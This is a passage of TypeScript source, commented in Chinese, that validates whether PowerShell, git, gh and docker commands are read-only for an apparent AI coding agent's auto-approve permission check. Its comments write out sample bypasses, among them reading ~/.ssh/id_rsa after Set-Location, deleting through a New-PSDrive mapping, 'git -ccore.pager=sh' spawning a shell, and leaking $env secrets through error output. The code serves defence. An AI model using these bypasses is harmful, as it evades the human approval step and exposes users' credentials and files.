 * 2. 创建 PSDrive 的 cmdlet：New-PSDrive（及其别名 ndr，Windows 上还有 mount）。
 *    后续以驱动器为前缀的路径（如 p:/foo）将通过新的驱动器根解析，而非文件系统。
 *    发现 #21：`New-PSDrive -Name p -Root /etc; Remove-Item p:/passwd` —— 验证器无法得知 p: 映射到 /etc。
 *
 * 任何包含上述之一的复合命令，其后续语句的相对路径/驱动器前缀路径均无法基于过时的验证器 cwd 进行验证。
 *
 * 函数名保留与 BashTool 的对等性（isCwdChangingCmdlet ↔ compoundCommandHasCd）；
 * 语义上为“改变路径解析命名空间”。
 */
export function isCwdChangingCmdlet(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return (
    canonical === 'set-location' ||
    canonical === 'push-location' ||
    canonical === 'pop-location' ||
    // New-PSDrive 创建驱动器映射，将 <name>:/... 路径重定向到任意文件系统根目录。
    // 别名 ndr/mount 不在 COMMON_ALIASES 中——需显式检查（发现 #21）。
    canonical === 'new-psdrive' ||
    // ndr/mount 是 PowerShell 中 New-PSDrive 的别名（仅限 Windows）。
    // 在 POSIX 上，'mount' 是原生的 mount(8) 命令；将其视为创建 PSDrive 会产生误报。（bug #15 / 审查 nit）
    (getPlatform() === 'windows' &&
      (canonical === 'ndr' || canonical === 'mount'))
  )
}

/**
 * 检查命令名称（经过别名解析后）是否为安全输出 cmdlet。
 */
export function isSafeOutputCommand(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return SAFE_OUTPUT_CMDLETS.has(canonical)
}

/**
 * 检查命令元素是否为已从 SAFE_OUTPUT_CMDLETS 移至 CMDLET_ALLOWLIST 的管道尾部转换器
 * （即 PIPELINE_TAIL_CMDLETS 集合），并且通过 isAllowlistedCommand 的 argLeaksValue 防护。
 *
 * 这是为需要保留“跳过无害管道尾部”行为的 isSafeOutputCommand 调用方提供的狭窄回退路径，
 * 适用于 Format-Table / Select-Object 等。不匹配完整的 CMDLET_ALLOWLIST——仅匹配迁移的转换器。
 */
export function isAllowlistedPipelineTail(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  const canonical = resolveToCanonical(cmd.name)
  if (!PIPELINE_TAIL_CMDLETS.has(canonical)) {
    return false
  }
  return isAllowlistedCommand(cmd, originalCommand)
}

/**
 * 只读自动放行的故障关闭关口。仅当 PipelineAst 中的每个元素都是 CommandAst 时返回 true——
 * 这是我们能完全验证的唯一语句形态。其他所有形态（赋值、控制流、表达式源、链式运算符）默认返回 false。
 *
 * 通往 true 的唯一代码路径。PowerShell 新增的 AST 类型将自然而然地落入 false。
 */
export function isProvablySafeStatement(stmt: ParsedStatement): boolean {
  if (stmt.statementType !== 'PipelineAst') return false
  // 空命令 → 下方循环的真空通过。PowerShell 解析器保证有效源码的 PipelineAst.PipelineElements ≥ 1，
  // 但此关口至关重要——防御解析器/JSON 边缘情况。
  if (stmt.commands.length === 0) return false
  for (const cmd of stmt.commands) {
    if (cmd.elementType !== 'CommandAst') return false
  }
  return true
}

/**
 * 在白名单中查找命令，首先解析别名。
 * 若找到则返回配置，否则返回 undefined。
 */
function lookupAllowlist(name: string): CommandConfig | undefined {
  const lower = name.toLowerCase()
  // 首先直接查找
  const direct = CMDLET_ALLOWLIST[lower]
  if (direct) {
    return direct
  }
  // 解析别名为规范名称并查找
  const canonical = resolveToCanonical(lower)
  if (canonical !== lower) {
    return CMDLET_ALLOWLIST[canonical]
  }
  return undefined
}

/**
 * 对 PowerShell 命令中与安全相关的模式进行同步正则检查。
 * 用于 isReadOnly（必须同步），作为 cmdlet 白名单检查前的快速预过滤。
 * 这镜像了 BashTool 的 checkReadOnlyConstraints，后者在评估只读状态前会检查 bashCommandIsSafe_DEPRECATED。
 *
 * 如果命令包含表明其不应被视为只读的模式，即使 cmdlet 在白名单中也返回 true。
 */
export function hasSyncSecurityConcerns(command: string): boolean {
  const trimmed = command.trim()
  if (!trimmed) {
    return false
  }

  // 子表达式：$(...) 可执行任意代码
  if (/\$\(/.test(trimmed)) {
    return true
  }

  // Splatting：@variable 传递任意参数。真正的 splatting 位于 token 起始处——
  // `@` 前为空白/分隔符/开头，而非单词中间部分。
  // `[^\w.]` 排除单词字符和 `.`，因此 `user@example.com`（电子邮件）和 `file.@{u}` 不会匹配，
  // 但 ` @splat` / `;@splat` / `^@splat` 会匹配。
  if (/(?:^|[^\w.])@\w+/.test(trimmed)) {
    return true
  }

  // 成员调用：.Method() 可调用任意 .NET 方法
  if (/\.\w+\s*\(/.test(trimmed)) {
    return true
  }

  // 赋值：$var = ... 可修改状态
  if (/\$\w+\s*[+\-*/]?=/.test(trimmed)) {
    return true
  }

  // 停止解析符号：--% 将原始内容传递给原生命令
  if (/--%/.test(trimmed)) {
    return true
  }

  // UNC 路径：\\server\share 或 //server/share 可触发网络请求并泄漏 NTLM/Kerberos 凭据
  // eslint-disable-next-line custom-rules/no-lookbehind-regex -- 原子搜索，命令字符串较短
  if (/\\\\/.test(trimmed) || /(?<!:)\/\//.test(trimmed)) {
    return true
  }

  // 静态方法调用：[Type]::Method() 可调用任意 .NET 方法
  if (/::/.test(trimmed)) {
    return true
  }

  return false
}

/**
 * 基于 cmdlet 白名单检查 PowerShell 命令是否为只读。
 *
 * @param command - 原始 PowerShell 命令字符串
 * @param parsed - 命令的 AST 解析表示
 * @returns 若命令为只读则返回 true，否则返回 false
 */
export function isReadOnlyCommand(
  command: string,
  parsed?: ParsedPowerShellCommand,
): boolean {
  const trimmedCommand = command.trim()
  if (!trimmedCommand) {
    return false
  }

  // 若无解析后的 AST，保守地返回 false
  if (!parsed) {
    return false
  }

  // 若解析失败，拒绝
  if (!parsed.valid) {
    return false
  }

  const security = deriveSecurityFlags(parsed)
  // 拒绝包含脚本块的命令——我们无法验证其中的代码
  // 例如，Get-Process | ForEach-Object { Remove-Item C:\foo } 看似安全的管道，
  // 但脚本块包含破坏性代码
  if (
    security.hasScriptBlocks ||
    security.hasSubExpressions ||
    security.hasExpandableStrings ||
    security.hasSplatting ||
    security.hasMemberInvocations ||
    security.hasAssignments ||
    security.hasStopParsing
  ) {
    return false
  }

  const segments = getPipelineSegments(parsed)

  if (segments.length === 0) {
    return false
  }

  // 安全说明：阻止包含改变 cwd 的 cmdlet（Set-Location/Push-Location/Pop-Location/New-PSDrive）
  // 并与其他任何语句组合的复合命令。此前范围仅限于 cd+git，但这忽略了 isReadOnlyCommand 对 cd+read 复合命令的自动放行路径（发现 #27）：
  //   Set-Location ~; Get-Content ./.ssh/id_rsa
  // 两个 cmdlet 均在 CMDLET_ALLOWLIST 中，因此若无此防护，复合命令将自动放行。
  // 路径解析将 ./.ssh/id_rsa 相对于过时的验证器 cwd（例如 /project）进行验证，遗漏了任何 Read(~/.ssh/**) 拒绝规则。
  // 运行时 PowerShell 会 cd 到 ~，读取 ~/.ssh/id_rsa。
  //
  // 任何包含改变 cwd 的 cmdlet 的复合命令，当其他语句可能使用相对路径时，均不能自动归类为只读——
  // 这些路径在运行时与验证时的解析结果不同。BashTool 通过 compoundCommandHasCd 传入路径验证实现了等效防护。
  const totalCommands = segments.reduce(
    (sum, seg) => sum + seg.commands.length,
    0,
  )
  if (totalCommands > 1) {
    const hasCd = segments.some(seg =>
      seg.commands.some(cmd => isCwdChangingCmdlet(cmd.name)),
    )
    if (hasCd) {
      return false
    }
  }

  // 单独检查每条语句——必须全部为只读
  for (const pipeline of segments) {
    if (!pipeline || pipeline.commands.length === 0) {
      return false
    }

    // 拒绝文件重定向（写入文件）。`> $null` 丢弃输出，不写入文件系统，因此不取消只读资格。
    if (pipeline.redirections.length > 0) {
      const hasFileRedirection = pipeline.redirections.some(
        r => !r.isMerging && !isNullRedirectionTarget(r.target),
      )
      if (hasFileRedirection) {
        return false
      }
    }

    // 第一个命令必须在白名单中
    const firstCmd = pipeline.commands[0]
    if (!firstCmd) {
      return false
    }

    if (!isAllowlistedCommand(firstCmd, command)) {
      return false
    }

    // 管道中剩余的命令必须是安全输出 cmdlet 或已通过参数验证的白名单命令。
    // Format-Table/Measure-Object 经过安全审查（发现均接受计算属性哈希表）后从 SAFE_OUTPUT_CMDLETS 移至 CMDLET_ALLOWLIST。
    // isAllowlistedCommand 会运行其 argLeaksValue 回调：裸的 `| Format-Table` 通过，`| Format-Table $env:SECRET` 失败。
    // 安全说明：nameType 关口捕获 'scripts\\Out-Null'（原始名称含路径字符 → 'application'）。
    // cmd.name 被剥离为 'Out-Null'，可匹配 SAFE_OUTPUT_CMDLETS，但 PowerShell 实际运行 scripts\\Out-Null.ps1。
    for (let i = 1; i < pipeline.commands.length; i++) {
      const cmd = pipeline.commands[i]
      if (!cmd || cmd.nameType === 'application') {
        return false
      }
      // 安全说明：isSafeOutputCommand 仅基于名称；仅对无参数调用进行短路处理。
      // Out-String -InputObject:(rm x) —— 括号在 Out-String 运行时被评估。仅基于名称检查且有参数时，
      // 冒号绑定的括号会被绕过。当参数存在时，强制使用 isAllowlistedCommand（参数验证）——
      // Out-String/Out-Null/Out-Host 不在 CMDLET_ALLOWLIST 中，因此任何参数都会导致拒绝。
      //   概念验证：Get-Process | Out-String -InputObject:(Remove-Item /tmp/x)
      //   → 自动放行 → Remove-Item 执行。
      if (isSafeOutputCommand(cmd.name) && cmd.args.length === 0) {
        continue
      }
      if (!isAllowlistedCommand(cmd, command)) {
        return false
      }
    }

    // 安全说明：拒绝包含嵌套命令的语句。nestedCommands 是在脚本块参数内部、
    // 冒号绑定参数的 ParenExpressionAst 子节点或其他非顶层位置中找到的 CommandAst 节点。
    // 包含 nestedCommands 的语句从定义上就不是简单的只读调用——它包含可执行的子管道，绕过了上述的逐命令白名单检查。
    if (pipeline.nestedCommands && pipeline.nestedCommands.length > 0) {
      return false
    }
  }

  return true
}

/**
 * 检查单个命令元素是否在白名单中并通过标志验证。
 */
export function isAllowlistedCommand(
  cmd: ParsedCommandElement,
  originalCommand: string,
): boolean {
  // 安全说明：nameType 基于原始（stripModulePrefix 前）的名称计算。
  // 'application' 表示原始名称包含路径字符（. \\ /）——例如 'scripts\\Get-Process'、'./git'、'node.exe'。
  // PowerShell 将这些解析为文件路径，而非剥离后名称匹配的 cmdlet/命令。绝不自动放行：
  // 白名单是为 cmdlet 而非任意脚本构建的。已知附带影响：'Microsoft.PowerShell.Management\\Get-ChildItem'
  // 也会归类为 'application'（包含 . 和 \\），将触发提示。鉴于实践中模块限定名称罕见，且提示是安全的，可以接受。
  if (cmd.nameType === 'application') {
    // 对明确安全的 .exe 名称进行旁路（与 bash 的 `which` 对等——见 SAFE_EXTERNAL_EXES）。
    // 安全说明：匹配 cmd.text 的原始第一个 token，而非 cmd.name。
    // stripModulePrefix 会将 scripts\where.exe 折叠为 cmd.name='where.exe'，但 cmd.text 保留了 'scripts\where.exe ...'。
    const rawFirstToken = cmd.text.split(/\s/, 1)[0]?.toLowerCase() ?? ''
    if (!SAFE_EXTERNAL_EXES.has(rawFirstToken)) {
      return false
    }
    // 继续执行 lookupAllowlist——CMDLET_ALLOWLIST['where.exe'] 处理标志验证（空配置 = 所有标志均允许，与 bash 的 `which` 一致）。
  }

  const config = lookupAllowlist(cmd.name)
  if (!config) {
    return false
  }

  // 若存在正则表达式约束，则对原始命令进行检查
  if (config.regex && !config.regex.test(originalCommand)) {
    return false
  }

  // 若存在额外的回调，则进行检查
  if (config.additionalCommandIsDangerousCallback?.(originalCommand, cmd)) {
    return false
  }

  // 安全说明：白名单化参数的 elementTypes——仅 StringConstant 和 Parameter 可静态验证。
  // 其他所有类型在运行时均会展开/求值：
  //   'Variable'          → `Get-Process $env:AWS_SECRET_ACCESS_KEY` 展开，
  //                         错误 "Cannot find process 'sk-ant-...'"，模型从错误中读取秘密
  //   'Other' (Hashtable) → `Get-Process @{k=$env:SECRET}` 同样泄漏
  //   'Other' (Convert)   → `Get-Process [string]$env:SECRET` 同样泄漏
  //   'Other' (BinaryExpr)→ `Get-Process ($env:SECRET + '')` 同样泄漏
  //   'SubExpression'     → 任意代码（已被 isReadOnlyCommand 层的 deriveSecurityFlags 捕获，
  //                         但 isAllowlistedCommand 也会被 checkPermissionMode 直接调用）
  // hasSyncSecurityConcerns 无法捕获裸 $var（仅匹配 `$(`/@var/.Method(/$var=/--%/::)；
  // deriveSecurityFlags 没有 'Variable' 分支；下方 safeFlags 循环验证标志名称，但不验证位置参数的类型。
  // 文件 cmdlet（CMDLET_PATH_CONFIG）已受 pathValidation.ts 中 SAFE_PATH_ELEMENT_TYPES 的保护——
  // 此处填补了非文件 cmdlet（Get-Process、Get-Service、Get-Command 等约 15 个）的空白。
  // 相当于 Bash 在 BashTool/readOnlyValidation.ts:~1356 处对所有 `$` token 的全面检查。
  //
  // 位置：置于外部命令分发之前，使 git/gh/docker/dotnet 也受此保护（与其基于字符串的 `$` 检查构成纵深防御；
  // 能捕获 `$` 子串遗漏的 @{...}/[cast]/($a+$b)）。在 PS 参数模式下，裸的 `5` token 化为 StringConstant（BareWord），
  // 而非数字字面量，因此 `git log -n 5` 通过。
  //
  // 安全说明：elementTypes 未定义 → 故障关闭。真正的解析器始终会设置它（parser.ts:769/781/812），
  // 因此未定义意味着不可信或格式错误的元素。此前为测试辅助便利而跳过（故障开放）；测试辅助现已显式设置 elementTypes。
  // elementTypes[0] 是命令名称；参数从 elementTypes[1] 开始。
  if (!cmd.elementTypes) {
    return false
  }
  {
    for (let i = 1; i < cmd.elementTypes.length; i++) {
      const t = cmd.elementTypes[i]
      if (t !== 'StringConstant' && t !== 'Parameter') {
        // ArrayLiteralAst (`Get-Process Name, Id`) 映射为 'Other'。
        // 上述列举的泄漏途径在其 extent 文本中均含有元字符：Hashtable `@{`、Convert `[`、带变量的 BinaryExpr `$`、
        // ParenExpr `(`。仅包含标识符的逗号列表不含这些字符。
        if (!/[$(@{[]/.test(cmd.args[i - 1] ?? '')) {
          continue
        }
        return false
      }
      // 冒号绑定的参数（`-Flag:$env:SECRET`）是单一的 CommandParameterAst——
      // 其 VariableExpressionAst 作为 .Argument 子节点存在，并非独立的 CommandElement，
      // 因此 elementTypes 显示为 'Parameter'，上述白名单通过。
      //
      // 查询解析器的 children[] 树结构，而非对参数文本进行字符串考古。
      // children[i-1] 保存了 .Argument 子节点的映射类型（与 args[i-1] 对齐）。
      // 树查询比字符串检查捕获更多——例如 `-InputObject:@{k=v}`（HashtableAst → 'Other'，文本中无 `$`），
      // `-Name:('payload' > file)`（带重定向的 ParenExpressionAst）。
      // 当 children 未定义时（向后兼容/未设置的测试辅助），回退至扩展的元字符检查。
      if (t === 'Parameter') {
        const paramChildren = cmd.children?.[i - 1]
        if (paramChildren) {
          if (paramChildren.some(c => c.type !== 'StringConstant')) {
            return false
          }
        } else {
          // 回退：对参数文本进行字符串考古（适用于旧解析器）。
          // 拒绝 `$`（变量）、`(`（ParenExpressionAst）、`@`（哈希/数组子表达式）、
          // `{`（脚本块）、`[`（类型字面量/静态方法）。
          const arg = cmd.args[i - 1] ?? ''
          const colonIdx = arg.indexOf(':')
          if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
            return false
          }
        }
      }
    }
  }

  const canonical = resolveToCanonical(cmd.name)

  // 通过共享验证处理外部命令
  if (
    canonical === 'git' ||
    canonical === 'gh' ||
    canonical === 'docker' ||
    canonical === 'dotnet'
  ) {
    return isExternalCommandSafe(canonical, cmd.args)
  }

  // 在 Windows 上，/ 是原生命令的有效标志前缀（例如 findstr /S）。
  // 但 PowerShell cmdlet 始终使用 - 前缀的参数，因此 /tmp 是路径而非标志。
  // 我们通过检查命令是否解析为动词-名词形式的规范名称（直接或通过别名）来检测 cmdlet。
  const isCmdlet = canonical.includes('-')

  // 安全说明：若设置了 allowAllFlags，则跳过标志验证（命令的整个标志集均为只读）。
  // 否则，缺失或为空的 safeFlags 意味着“仅允许位置参数，拒绝所有标志”——而非“接受一切”。
  if (config.allowAllFlags) {
    return true
  }
  if (!config.safeFlags || config.safeFlags.length === 0) {
    // 未定义 safeFlags 且未设置 allowAllFlags：拒绝任何标志。
    // 仍允许仅位置参数（下方循环不会触发）。这是安全的默认值——命令必须主动选择接受标志。
    const hasFlags = cmd.args.some((arg, i) => {
      if (isCmdlet) {
        return isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      }
      return (
        arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
      )
    })
    return !hasFlags
  }

  // 验证使用的所有标志是否均在白名单中。
  // 安全说明：以 elementTypes 作为参数检测的基准事实。PowerShell 的词法分析器接受短破折号/长破折号/水平线（U+2013/2014/2015）
  // 作为参数前缀；原始的 startsWith('-') 检查会遗漏 `–ComputerName`（短破折号）。
  // 解析器将 CommandParameterAst 映射为 'Parameter'，无论破折号字符为何。
  // elementTypes[0] 是名称元素；参数从 elementTypes[1] 开始。
  for (let i = 0; i < cmd.args.length; i++) {
    const arg = cmd.args[i]!
    // 对于 cmdlet：信任 elementTypes（AST 基准事实，能捕获 Unicode 破折号）。
    // 对于 Windows 上的原生 exe：同时检查 `/` 前缀（argv 约定，非词法分析器——解析器将 `/S` 视为位置参数，而非 CommandParameterAst）。
    const isFlag = isCmdlet
      ? isPowerShellParameter(arg, cmd.elementTypes?.[i + 1])
      : arg.startsWith('-') ||
        (process.platform === 'win32' && arg.startsWith('/'))
    if (isFlag) {
      // 对于 cmdlet，将 Unicode 破折号规范化为 ASCII 连字符，以便与 safeFlags 比较（safeFlags 条目均以 ASCII `-` 书写）。
      // 原生 exe 的 safeFlags 以 `/` 存储（例如 '/FO'）——保持不变。
      let paramName = isCmdlet ? '-' + arg.slice(1) : arg
      const colonIndex = paramName.indexOf(':')
      if (colonIndex > 0) {
        paramName = paramName.substring(0, colonIndex)
      }

      // -ErrorAction/-Verbose/-Debug 等通过 [CmdletBinding()] 被所有 cmdlet 接受，
      // 仅路由错误/警告/进度流——它们无法使只读 cmdlet 变为写入操作。pathValidation.ts 已将这些合并到其每个 cmdlet 的参数集中（约第 1339 行）；
      // 此处是对 safeFlags 的相同合并。若无此合并，`Get-Content file.txt -ErrorAction SilentlyContinue` 尽管 Get-Content 在白名单中仍会触发提示。
      // 仅适用于 cmdlet——原生 exe 没有通用参数。
      const paramLower = paramName.toLowerCase()
      if (isCmdlet && COMMON_PARAMETERS.has(paramLower)) {
        continue
      }
      const isSafe = config.safeFlags.some(
        flag => flag.toLowerCase() === paramLower,
      )
      if (!isSafe) {
        return false
      }
    }
  }

  return true
}

// ---------------------------------------------------------------------------
// 外部命令验证（git、gh、docker），使用共享配置
// ---------------------------------------------------------------------------

function isExternalCommandSafe(command: string, args: string[]): boolean {
  switch (command) {
    case 'git':
      return isGitSafe(args)
    case 'gh':
      return isGhSafe(args)
    case 'docker':
      return isDockerSafe(args)
    case 'dotnet':
      return isDotnetSafe(args)
    default:
      return false
  }
}

const DANGEROUS_GIT_GLOBAL_FLAGS = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  // 安全说明：--attr-source 造成解析器差异。Git 将树状值后的 token 视为路径规范（而非子命令），
  // 但我们的跳两格循环会将其视作子命令：
  //   git --attr-source HEAD~10 log status
  //   验证器：跳过 HEAD~10，看到 subcmd=log → 允许
  //   git：      将 `log` 作为路径规范消费，运行 `status` 作为真正的子命令
  // 经 `GIT_TRACE=1 git --attr-source HEAD~10 log status` 验证 → `trace: built-in: git status`。
  // 直接拒绝，而非跳两格。
  '--attr-source',
])

// 接受独立（空格分隔）值参数的 git 全局标志。
// 当循环遇到不带内联 `=` 值的此类标志时，必须跳过下一个 token，以免将值误认为子命令。
//
// 安全说明：此集合必须完整。任何未列出的消费值的全局标志都会造成解析器差异：
// 验证器将值视为子命令，git 消费该值并运行下一个 token。
// 已针对 git 2.51 审核 `man git` 及 GIT_TRACE；--list-cmds 仅接受 `=` 形式，
// 布尔标志（-p/--bare/--no-*/--*-pathspecs/--html-path 等）通过默认路径前进 1 格。
// --attr-source 已移除：它还会触发路径规范解析，造成第二个差异——已移至上方的 DANGEROUS_GIT_GLOBAL_FLAGS。
const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
  '-c',
  '-C',
  '--exec-path',
  '--config-env',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--shallow-file',
])

// 接受附加形式值（标志字母与值之间无空格）的 git 短全局标志。
// 长选项（--git-dir 等）需要 `=` 或空格，因此基于 `=` 的拆分检查已能处理。
// 但 `-ccore.pager=sh` 和 `-C/path` 需要前缀匹配：git 直接解析 `-c<name>=<value>` 和 `-C<path>`。
const DANGEROUS_GIT_SHORT_FLAGS_ATTACHED = ['-c', '-C']

function isGitSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // 安全说明：拒绝任何包含 `$`（变量引用）的参数。裸的 VariableExpressionAst 位置参数会以字面文本（$env:SECRET、$VAR）到达此处。
  // deriveSecurityFlags 不会拦截裸 Variable 参数。验证器将 `$VAR` 视为文本；PowerShell 在运行时展开它。解析器差异：
  //   git diff $VAR   其中 $VAR = '--output=/tmp/evil'
  //   → 验证器看到位置参数 '$VAR' → validateFlags 通过
  //   → PowerShell 运行 `git diff --output=/tmp/evil` → 写入文件
  // 这将下方 ls-remote 的内联 `$` 防护推广到所有 git 子命令。
  // Bash 对等物：BashTool 在 readOnlyValidation.ts:~1352 处的全面 `$` 拒绝。isGhSafe 具有相同的防护。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  // 跳过子命令前的全局标志，拒绝危险的标志。
  // 接受空格分隔值的标志必须消费下一个 token，以免将其误认为子命令（例如 `git --namespace foo status`）。
  let idx = 0
  while (idx < args.length) {
    const arg = args[idx]
    if (!arg || !arg.startsWith('-')) {
      break
    }
    // 安全说明：附加形式的短标志。`-ccore.pager=sh` 在 `=` 处拆分为 `-ccore.pager`，不在 DANGEROUS_GIT_GLOBAL_FLAGS 中。
    // Git 接受无空格的 `-c<name>=<value>` 和 `-C<path>`。我们必须进行前缀匹配。
    // 注意：`--cached`、`--config-env` 等在位置 1 处（`-` ≠ `c`）已无法通过 startsWith('-c') 检查。
    // `!== '-'` 防护仅适用于 `-c`（git 配置键从不以 `-` 开头，因此 `-c-key` 不现实）。
    // 它不适用于 `-C`——目录路径可以以 `-` 开头，因此 `git -C-trap status` 必须被拒绝。
    // `git -ccore.pager=sh log` 会启动一个 shell。
    for (const shortFlag of DANGEROUS_GIT_SHORT_FLAGS_ATTACHED) {
      if (
        arg.length > shortFlag.length &&
        arg.startsWith(shortFlag) &&
        (shortFlag === '-C' || arg[shortFlag.length] !== '-')
      ) {
        return false
      }
    }
    const hasInlineValue = arg.includes('=')
    const flagName = hasInlineValue ? arg.split('=')[0] || '' : arg
    if (DANGEROUS_GIT_GLOBAL_FLAGS.has(flagName)) {
      return false
    }
    // 若标志接受独立的值，则消费下一个 token
    if (!hasInlineValue && GIT_GLOBAL_FLAGS_WITH_VALUES.has(flagName)) {
      idx += 2
    } else {
      idx++
    }
  }

  if (idx >= args.length) {
    return true
  }

  // 首先尝试多词子命令（例如 'stash list'、'config --get'、'remote show'）
  const first = args[idx]?.toLowerCase() || ''
  const second = idx + 1 < args.length ? args[idx + 1]?.toLowerCase() || '' : ''

  // GIT_READ_ONLY_COMMANDS 的键形如 'git diff'、'git stash list'
  const twoWordKey = `git ${first} ${second}`
  const oneWordKey = `git ${first}`

  let config: ExternalCommandConfig | undefined =
    GIT_READ_ONLY_COMMANDS[twoWordKey]
  let subcommandTokens = 2

  if (!config) {
    config = GIT_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(idx + subcommandTokens)

  // git ls-remote URL 拒绝——移植自 BashTool 的内联防护
  // （src/tools/BashTool/readOnlyValidation.ts:~962）。带 URL 的 ls-remote 是数据外泄途径（将秘密编码在主机名中 → DNS/HTTP）。
  // 拒绝类似 URL 的位置参数：`://`（http/git 协议）、`@` + `:`（SSH git@host:path），以及 `$`（变量引用——$env:URL
  // 当参数的 elementType 为 Variable 时，会以字面字符串 '$env:URL' 到达此处；安全检查不会拦截传递给外部命令的裸 Variable 位置参数）。
  if (first === 'ls-remote') {
    for (const arg of flagArgs) {
      if (!arg.startsWith('-')) {
        if (
          arg.includes('://') ||
          arg.includes('@') ||
          arg.includes(':') ||
          arg.includes('$')
        ) {
          return false
        }
      }
    }
  }

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config, { commandName: 'git' })
}

function isGhSafe(args: string[]): boolean {
  // gh 命令依赖网络；仅对 ant 用户允许
  if (process.env.USER_TYPE !== 'ant') {
    return false
  }

  if (args.length === 0) {
    return true
  }

  // 首先尝试双词子命令（例如 'pr view'）
  let config: ExternalCommandConfig | undefined
  let subcommandTokens = 0

  if (args.length >= 2) {
    const twoWordKey = `gh ${args[0]?.toLowerCase()} ${args[1]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[twoWordKey]
    subcommandTokens = 2
  }

  // 尝试单词子命令（例如 'gh version'）
  if (!config && args.length >= 1) {
    const oneWordKey = `gh ${args[0]?.toLowerCase()}`
    config = GH_READ_ONLY_COMMANDS[oneWordKey]
    subcommandTokens = 1
  }

  if (!config) {
    return false
  }

  const flagArgs = args.slice(subcommandTokens)

  // 安全说明：拒绝任何包含 `$`（变量引用）的参数。裸的 VariableExpressionAst 位置参数会以字面文本（$env:SECRET）到达此处。
  // deriveSecurityFlags 不会拦截裸 Variable 参数——仅拦截子表达式、splatting、可展开字符串等。
  // 所有 gh 子命令均面向网络，因此变量参数是数据外泄途径：
  //   gh search repos $env:SECRET_API_KEY
  //   → PowerShell 运行时展开 → 秘密被发送至 GitHub API。
  // git ls-remote 具有等效的内联防护；此处将其推广到 gh。
  // Bash 对等物：BashTool 在 readOnlyValidation.ts:~1352 处的全面 `$` 拒绝。
  for (const arg of flagArgs) {
    if (arg.includes('$')) {
      return false
    }
  }
  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDockerSafe(args: string[]): boolean {
  if (args.length === 0) {
    return true
  }

  // 安全说明：全面的 PowerShell `$` 变量拒绝。与 isGitSafe 和 isGhSafe 相同的防护。
  // 解析器差异：验证器看到字面 '$env:X'；PowerShell 运行时展开。
  // 运行在快速路径返回之前——之前的位置（快速路径之后）对于 `docker ps`/`docker images` 从未触发。
  // 先前认为这些命令不接受 --format 的评论是错误的：`docker ps --format $env:AWS_SECRET_ACCESS_KEY`
  // 自动放行，PowerShell 展开，docker 在输出中报错并包含秘密，模型读取之。
  // 检查所有参数，而不仅是 flagArgs——args[0]（子命令槽）也可能是 `$env:X`。
  // elementTypes 白名单在此不适用：此函数接收 string[]（字符串化后），而非 ParsedCommandElement；
  // isAllowlistedCommand 的调用方在上层应用 elementTypes 关口。
  for (const arg of args) {
    if (arg.includes('$')) {
      return false
    }
  }

  const oneWordKey = `docker ${args[0]?.toLowerCase()}`

  // 快速路径：EXTERNAL_READONLY_COMMANDS 条目（'docker ps'、'docker images'）无标志约束——在上方 $ 防护后无条件允许。
  if (EXTERNAL_READONLY_COMMANDS.includes(oneWordKey)) {
    return true
  }

  // DOCKER_READ_ONLY_COMMANDS 条目（'docker logs'、'docker inspect'）具有逐标志配置。
  // 镜像 isGhSafe：查找配置，然后调用 validateFlags。
  const config: ExternalCommandConfig | undefined =
    DOCKER_READ_ONLY_COMMANDS[oneWordKey]
  if (!config) {
    return false
  }

  const flagArgs = args.slice(1)

  if (
    config.additionalCommandIsDangerousCallback &&
    config.additionalCommandIsDangerousCallback('', flagArgs)
  ) {
    return false
  }
  return validateFlags(flagArgs, 0, config)
}

function isDotnetSafe(args: string[]): boolean {
  if (args.length === 0) {
    return false
  }

  // dotnet 使用顶层标志，如 --version、--info、--list-runtimes
  // 所有参数必须属于安全集合
  for (const arg of args) {
    if (!DOTNET_READ_ONLY_FLAGS.has(arg.toLowerCase())) {
      return false
    }
  }

  return true
}
